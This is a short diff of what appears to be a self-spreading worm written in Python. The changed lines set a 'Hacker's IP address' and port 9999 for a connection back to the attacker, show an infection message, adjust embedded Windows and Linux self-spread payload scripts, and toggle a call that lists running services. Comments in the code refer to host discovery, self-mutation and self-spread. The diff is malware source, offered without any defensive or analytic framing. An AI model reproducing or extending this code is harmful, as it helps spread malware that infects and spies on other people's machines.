@@ -11,7 +11,7 @@ import random
 import re
 
 # ----------- Variables -----------
-host = '192.168.73.1' #Hacker's IP address as a string
+host = '192.168.118.129' #Hacker's IP address as a string
 port = 9999
 target_os = None
 infection_message = "You've been infected!!"
@@ -38,8 +38,7 @@ windows_services_lister_ps1 = (
     '}\n'
 )
 
-windows_first_time_spread_data = r"""
-@echo off & python -x \"%~f0\" %* & goto :eof
+windows_first_time_spread_data = r"""@echo off & python -x \"%~f0\" %* & goto :eof
 import socket
 import sys
 import time
@@ -481,8 +480,7 @@ sys.exit(1)
 # END OF SCRIPT
 """
 
-linux_first_time_spread_data = r"""
-#!/usr/bin/env python3
+linux_first_time_spread_data = r"""#!/usr/bin/env python3
 import socket
 import sys
 import time
@@ -1337,7 +1335,7 @@ get_user_info(s)
 # if target_os != "Windows":
 # find_hosts_on_network(s)
 # (4.4) See what services are running & whats ports are open.
-find_running_services(s)
+# find_running_services(s)
 
 # (5) Self Mutations && (6) Perform Self Spread
 if spread_counter > 0:
